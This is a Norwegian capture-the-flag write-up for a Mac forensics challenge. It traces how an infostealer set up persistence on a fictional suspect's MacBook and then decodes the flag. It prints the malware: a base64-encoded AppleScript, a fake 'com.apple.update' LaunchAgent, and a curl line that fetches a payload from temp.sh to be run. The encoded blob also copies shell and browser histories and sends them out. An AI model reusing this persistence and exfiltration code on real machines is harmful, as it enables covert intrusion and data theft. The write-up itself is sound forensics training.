# Mac - Persistens

Det har blitt gjennomført flere beslag hos den notoriske skattesvindleren Kjell T. Ringen. Taxman har startet analyse av Kjells Macbook med et hjemmesnekret collection verktøy, og har hentet ut delvis kopi av filsystemet og interessante artifakter.<br /><br />
Kjell har vært så uheldig å få kjørt noe kode til en infostealer. Infostealeren _forsøkte_ også å etablere persistens på maskinen. Finner du spor av persistensen?<br /><br />

> Alle Mac-oppgavene har samme fil som utgangspunkt: https://drive.proton.me/urls/NK9D7XR0E4#0tbSCce0ukHy <br /> Passord til zip-fil: `skattctf`

# Writeup

I oppgaven `Mac - Infostealer` finner vi skadevaren som Kjell kjørte på maskinen sin.
```bash
╰─$ cat Users/kjell.t.ringen/Downloads/show_hidden_files.bin
osascript -e "$(echo "LS0gcGVyc2lzdGVuY2Ugc3R1ZmYKCmRvIHNoZWxsIHNjcmlwdCAiCm1rZGlyIC1wIFwiJEhPTUUvLmZpeF9oaWRkZW5fZmlsZXNcIjsKbWtkaXIgLXAgXCIkSE9NRS9MaWJyYXJ5L0xhdW5jaEFnZW50c1wiOwpta2RpciAtcCBcIiRIT01FL0xpYnJhcnkvTG9ncy8uY2FjaGVcIjsKCmNhdCA+IFwiJEhPTUUvTGlicmFyeS9MYXVuY2hBZ2VudHMvY29tLmFwcGxlLnVwZGF0ZS5wbGlzdFwiIDw8J0VORF9QTElTVCcKPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwiVVRGLThcIj8+CjwhRE9DVFlQRSBwbGlzdCBQVUJMSUMgXCItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU5cIiAKIFwiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZFwiPgo8cGxpc3QgdmVyc2lvbj1cIjEuMFwiPgo8ZGljdD4KCiAgICA8a2V5PkxhYmVsPC9rZXk+CiAgICA8c3RyaW5nPmNvbS5hcHBsZS51cGRhdGU8L3N0cmluZz4KCiAgICA8a2V5PlByb2dyYW1Bcmd1bWVudHM8L2tleT4KICAgIDxhcnJheT4KICAgICAgICA8c3RyaW5nPi91c3IvYmluL29zYXNjcmlwdDwvc3RyaW5nPgogICAgICAgIDxzdHJpbmc+JEhPTUUvLmZpeF9oaWRkZW5fZmlsZXMvNzM2YjYxNzQ3NDQzNTQ0Njwvc3RyaW5nPgogICAgPC9hcnJheT4KCiAgICA8a2V5PlJ1bkF0TG9hZDwva2V5PgogICAgPHRydWUvPgoKICAgIDxrZXk+S2VlcEFsaXZlPC9rZXk+CiAgICA8dHJ1ZS8+CgogICAgPGtleT5TdGFuZGFyZE91dFBhdGg8L2tleT4KICAgIDxzdHJpbmc+JEhPTUUvTGlicmFyeS9Mb2dzLy5jYWNoZS91cGRhdGVyLmxvZzwvc3RyaW5nPgoKICAgIDxrZXk+U3RhbmRhcmRFcnJvclBhdGg8L2tleT4KICAgIDxzdHJpbmc+L1VzZXJzLyRIT01FL0xpYnJhcnkvTG9ncy8uY2FjaGUvdXBkYXRlci5lcnI8L3N0cmluZz4KCjwvZGljdD4KPC9wbGlzdD4KRU5EX1BMSVNUCiIKCmRvIHNoZWxsIHNjcmlwdCAiY3VybCAtWCBQT1NUIGh0dHBzOi8vdGVtcC5zaC9OR1JYay9maXgudHh0IHwgYmFzZTY0IC1kID4gJEhPTUUvLmZpeF9oaWRkZW5fZmlsZXMvNzM2YjYxNzQ3NDQzNTQ0NiIKZG8gc2hlbGwgc2NyaXB0ICJjaG1vZCAreCAkSE9NRS8uZml4X2hpZGRlbl9maWxlcy83MzZiNjE3NDc0NDM1NDQ2IgoKLS0gbG9hZCBwZXJzaXN0ZW50IGFnZW50IChtb2Rlcm4gbWFjT1MpCmRvIHNoZWxsIHNjcmlwdCAibGF1bmNoY3RsIGJvb3RzdHJhcCBndWkvJChpZCAtdSkgJEhPTUUvTGlicmFyeS9MYXVuY2hBZ2VudHMvY29tLmFwcGxlLnVwZGF0ZS5wbGlzdCAyPi9kZXYvbnVsbCIKCi0tIGdhdGhlciBsb290CmRvIHNoZWxsIHNjcmlwdCAiCkVYRklMX1BBVEg9XCIvdG1wLzEzMzMzMzMzN1wiOwpta2RpciAtcCAkRVhGSUxfUEFUSDsKY3AgXCIkSE9NRS8uYmFzaF9oaXN0b3J5XCIgJEVYRklMX1BBVEgvYmFzaF9oaXN0OwpjcCBcIiRIT01FLy56c2hfaGlzdG9yeVwiICRFWEZJTF9QQVRIL3pzaF9oaXN0OwpjcCBcIiRIT01FLy4qXCIgJEVYRklMX1BBVEgvaGlkZGVuX2ZpbGVzOwpjcCBcIiRIT01FL0xpYnJhcnkvU2FmYXJpL0hpc3RvcnkuZGJcIiAkRVhGSUxfUEFUSC9zYWZhcmlfaGlzdDsKY3AgXCIkSE9NRS9MaWJyYXJ5L0FwcGxpY2F0aW9uIFN1cHBvcnQvR29vZ2xlL0Nocm9tZS9EZWZhdWx0L0hpc3RvcnlcIiAkRVhGSUxfUEFUSC9jaHJvbWVfaGlzdDsKZWNobyBcIlUzUmxZV3hsY2kxbWJHRm5PaUJ6YTJGMGRIdG1jbVZsWldWZmJHOXZiMjl2YjNSOVwiIHwgYmFzZTY0IC1kID4gJEVYRklMX1BBVEgvbG9vdC50eHQ7CnppcCAtciAvdG1wL2xvb3QuemlwICRFWEZJTF9QQVRIOwpybSAtcmYgJEVYRklMX1BBVEg7CmN1cmwgLS1jb25uZWN0LXRpbWVvdXQgMTIwIC0tbWF4LXRpbWUgMzAwIC1YIFBPU1QgLUYgZmlsZT1AL3RtcC9sb290LnppcCBodHRwOi8vbG9jYWxob3N0L2xvb3Q7CiIKLS0gcmVtZW1iZXIgdG8gY2hhbmdlIGxvY2FsaG9zdCB0byBhY3R1YWwgZXhmaWwgaG9zdCEhISEh" | base64 -d)
```

Første delen av dette scriptet er skadevaren som setter opp persistens:
```osascript
-- persistence stuff

do shell script "
mkdir -p \"$HOME/.fix_hidden_files\";
mkdir -p \"$HOME/Library/LaunchAgents\";
mkdir -p \"$HOME/Library/Logs/.cache\";

cat > \"$HOME/Library/LaunchAgents/com.apple.update.plist\" <<'END_PLIST'
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" 
 \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>

    <key>Label</key>
    <string>com.apple.update</string>

    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/osascript</string>
        <string>$HOME/.fix_hidden_files/736b617474435446</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>StandardOutPath</key>
    <string>$HOME/Library/Logs/.cache/updater.log</string>

    <key>StandardErrorPath</key>
    <string>/Users/$HOME/Library/Logs/.cache/updater.err</string>

</dict>
</plist>
END_PLIST
"

do shell script "curl -X POST https://temp.sh/NGRXk/fix.txt | base64 -d > $HOME/.fix_hidden_files/736b617474435446"
do shell script "chmod +x $HOME/.fix_hidden_files/736b617474435446"

-- load persistent agent (modern macOS)
do shell script "launchctl bootstrap gui/$(id -u) $HOME/Library/LaunchAgents/com.apple.update.plist 2>/dev/null"
```
Her blir det satt opp en falsk oppdateringagent, `com.apple.update.plist`, som eksekverer filen `$HOME/.fix_hidden_files/736b617474435446`. Denne filen blir laget mot slutten av scriptet, hvor skadevaren hentes ned fra `temp[.]sh` og lagret i `$HOME/.fix_hidden_files/736b617474435446`. 
Hvis man lister innholdet i denne filen ser man følgende:
```bash
╰─$ cat Users/kjell.t.ringen/.fix_hidden_files/736b617474435446 | head -n1
-- Decode for CTF : QzItZmxhZzogc2thdHR7cGVyc2lzdGVuY2VfaXNfa2V5fQ==
```
Base64-decode: 
```bash
$ echo "QzItZmxhZzogc2thdHR7cGVyc2lzdGVuY2VfaXNfa2V5fQ==" | base64 -d
C2-flag: skatt{persistence_is_key}
```
> Filnavnet `736b617474435446` er forresten også hex for `skattCTF`.



# Flag

```
skatt{persistence_is_key}
```